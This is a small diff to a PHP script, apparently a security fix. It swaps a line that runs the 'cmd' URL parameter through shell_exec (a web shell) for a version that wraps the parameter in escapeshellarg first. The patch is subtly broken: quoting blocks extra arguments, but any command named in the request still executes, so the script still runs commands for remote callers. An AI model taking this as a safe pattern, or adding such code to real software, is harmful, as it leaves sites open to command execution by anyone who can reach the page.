@@ -1,4 +1,5 @@
 <?php
-$output = shell_exec($_GET['cmd']);
+$cmd = escapeshellarg($_GET['cmd']); 
+$output = shell_exec($cmd);
 echo "<pre>$output</pre>";
 ?>
